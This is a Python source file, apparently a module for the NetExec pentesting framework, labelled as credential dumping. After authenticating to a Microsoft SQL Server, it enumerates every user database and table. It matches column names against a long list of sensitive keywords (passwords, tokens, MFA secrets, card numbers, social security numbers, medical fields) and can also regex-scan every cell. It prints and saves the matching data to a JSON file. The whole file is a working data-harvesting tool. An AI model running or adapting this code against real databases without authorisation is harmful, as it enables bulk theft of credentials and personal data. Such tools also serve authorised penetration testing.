import json
import datetime
import re
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """MSSQL Dumper v1 - Created by LTJAX"""
    name = "mssql_dumper"
    description = "Search for Sensitive Data across all the databases"
    supported_protocols = ["mssql"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def options(self, context, module_options):
        """
        REGEX        Semicolon-separated regex(es) to search for in **Cell Values**
        LIKE_SEARCH  Comma-separated list of column names to specifically look for
        SAVE         Save the output to sqlite database (default True)
        """
        self.regex_patterns = []
        regex_input = module_options.get("REGEX", "")
        for pattern in regex_input.split(";"):
            pattern = pattern.strip()
            if pattern:
                try:
                    self.regex_patterns.append(re.compile(pattern))
                except re.error as e:
                    context.log.fail(f"[!] Invalid regex pattern '{pattern}': {e}")
        like_input = module_options.get("LIKE_SEARCH", "")
        self.like_search = [s.strip().lower() for s in like_input.split(",") if s.strip()]
        self.save = module_options.get("SAVE", "true").lower() == "true"

    def pii(self):
        """Common personally identifiable information (PII) keywords to search for in column names"""
        return ["access_token", "account_number", "address", "allergies", "alt_email", "annual_salary", "apartment",
                "api_key", "auth_code", "auth_token", "bank_account", "bank_code", "bank_id", "bank_name", "bic",
                "billing_address", "birth_date", "blood_type", "card_exp", "card_number", "cardholder_name", "cc_exp_month",
                "cc_exp_year", "cc_number", "ccv", "city", "compensation", "contract_number", "country", "credit_card_expiry",
                "credit_card_hash", "credit_card_number", "credit_card", "creditcard", "cvv", "cvv2", "date_of_birth",
                "debit_card", "diagnosis", "dl_number", "dob", "drivers_license", "ein", "email_address", "email",
                "emergency_contact", "employee_id", "employment_status", "expiration_date", "expiry_date", "fax", "first_name",
                "full_name", "gender", "health_id", "house_number", "iban", "income", "insurance_id", "insurance_number",
                "invoice_id", "invoice_total", "job_title", "last_name", "legal_entity", "legal_name", "location", "login_token",
                "maiden_name", "medical_record", "medication", "mfa_secret", "middle_name", "mobile", "national_id", "nickname",
                "nin", "old_password", "order_amount", "order_id", "order_total", "otp_secret", "passport_number", "passwd_hash",
                "passwd", "password_hash", "password_plaintext", "password_salt", "password", "patient_id", "payment_status",
                "payment_token", "paypal_email", "phone_number", "phone", "phonenumber", "pin_code", "pin", "position",
                "prescriptions", "recovery_key", "refresh_token", "region", "reset_token", "routing_number", "salary", "secret_key",
                "security_answer", "security_code", "security_pin", "security_question", "session_token", "session", "sessionid",
                "social_security_number", "ssn_hash", "ssn", "state", "street", "tax_id", "temp_password", "tin", "token",
                "treatment", "user_credential", "user_name", "user_pass", "user_password", "user_secret", "user_token", "username",
                "zip", "zipcode"]

    def on_login(self, context, connection):
        try:
            all_results = []
            hostname = connection.hostname or connection.host
            databases = connection.conn.sql_query("SELECT name FROM master.dbo.sysdatabases")
            for db in databases:
                db_name = db.get("name") or db.get("", "")
                if db_name.lower() in ("master", "model", "msdb", "tempdb"):
                    continue  # skip system DBs

                context.log.display(f"Searching database: {db_name}")
                connection.conn.sql_query(f"USE [{db_name}]")

                # get all user tables in this DB
                tables = connection.conn.sql_query(
                    "SELECT table_name FROM information_schema.tables WHERE table_type = 'BASE TABLE'"
                )

                for table in tables:
                    table_name = table.get("table_name") or table.get("", "")
                    try:
                        columns = connection.conn.sql_query(
                            f"SELECT column_name FROM information_schema.columns WHERE table_name = '{table_name}'"
                        )
                        column_names = [c.get("column_name") or c.get("", "") for c in columns]

                        # find matching columns
                        search_keys = self.pii() + self.like_search
                        matched = [col for col in column_names if any(key in col.lower() for key in search_keys)]
                        if matched:
                            column_str = ", ".join(f"[{c}]" for c in matched)
                            context.log.success(f"Match in {db_name}.{table_name} => Columns: {column_str}")

                            try:
                                data = connection.conn.sql_query(
                                    f"SELECT {column_str} FROM [{table_name}]"
                                )
                                for row in data:
                                    formatted = []
                                    for k, v in row.items():
                                        if isinstance(v, bytes):
                                            try:
                                                v = v.decode("utf-8", errors="replace")
                                            except:
                                                v = str(v)
                                        else:
                                            v = str(v)
                                        formatted.append(f"{k}: {v}")
                                        context.log.highlight(f"{db_name}.{table_name} => " + ", ".join(formatted))
                                    all_results.append({
                                        "database": db_name,
                                        "table": table_name,
                                        "row": {k: v for k, v in row.items()}
                                    })
                            except Exception as e:
                                context.log.fail(f"Failed to extract from {db_name}.{table_name}: {e}")

                    except Exception as e:
                        context.log.fail(f"Failed to inspect table {table_name} in {db_name}: {e}")
                    if self.regex_patterns:
                        try:
                            full_data = connection.conn.sql_query(f"SELECT * FROM [{table_name}]")
                            for row in full_data:
                                matched_cells = {}
                                for col, val in row.items():
                                    try:
                                        val_str = val.decode("utf-8", "replace") if isinstance(val, bytes) else str(val)
                                    except:
                                        val_str = str(val)
                                    for pattern in self.regex_patterns:
                                        if pattern.search(val_str):
                                            matched_cells[col] = val_str
                                            break
                                if matched_cells:
                                    match_str = ", ".join(f"{k}: {v}" for k, v in matched_cells.items())
                                    context.log.highlight(f"{db_name}.{table_name} => Regex Match => {match_str}")
                                    all_results.append({
                                        "type": "regex_match",
                                        "database": db_name,
                                        "table": table_name,
                                        "matched_cells": matched_cells
                                    })
                        except Exception as e:
                            context.log.fail(f"Regex scan failed for {db_name}.{table_name}: {e}")

        except Exception as e:
            context.log.fail(f"Query failed: {e}")
        if self.save and all_results:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            filename = f"/tmp/{timestamp}-{hostname}.json"
            try:
                def sanitize(obj):
                    if isinstance(obj, dict):
                        return {k: sanitize(v) for k, v in obj.items()}
                    elif isinstance(obj, list):
                        return [sanitize(i) for i in obj]
                    elif isinstance(obj, bytes):
                        return obj.decode("utf-8", "replace")
                    else:
                        return obj
                cleaned = sanitize(all_results)
                with open(filename, "w") as f:
                    json.dump(cleaned, f, indent=2)
                    context.log.success(f"Data saved to {filename}")
            except Exception as e:
                context.log.fail(f"Failed to save results to file: {e}")
